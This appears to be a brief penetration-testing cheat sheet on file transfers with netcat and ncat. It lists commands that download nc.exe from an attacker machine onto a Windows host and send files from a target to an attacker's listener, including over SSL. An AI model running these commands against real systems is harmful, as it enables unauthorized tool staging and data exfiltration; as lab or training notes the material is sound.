
# File Transfers with nc



```
locate nc.traditional
locate nc.exe
```


??
```
{ echo -e "GET /[FILE NAME] HTTP/1.0\r\n"; sleep 1; } | nc -n [IP] [PORT] > [OUTPUT NAME] && sed -i '1,/^$/d' [OUTPUT NAME]
```






1. get `nc.exe` from windows-binaries
```
powershell wget -Uri http://[ATTACKER MACHINE]/nc.exe -OutFile C:\Windows\Temp\nc.exe
```


2. From Kali, listen for incoming data and write it to a file:
```
nc -lvp 1234 > received_file.txt
```



3.a. Using CMD, send the file to the Kali Linux machine:
```
nc.exe <kali_ip> 1234 < C:\path\to\file.txt
```


3.b. Using PowerShell:
```
cmd.exe /c "your-cmd-command-here"

Get-Content -Path "C:\Users\username\Desktop\example.txt" | nc.exe 192.168.1.10 1234
```

















## Encrypted & Secure File Transfer

Set up listener on the TARGET:
```
ncat -nvlp port --ssl > out-file
```

And connect to the listener from the ATTACKER MACHINE:
```
ncat -nv target-ip port --ssl < file-to-send
```

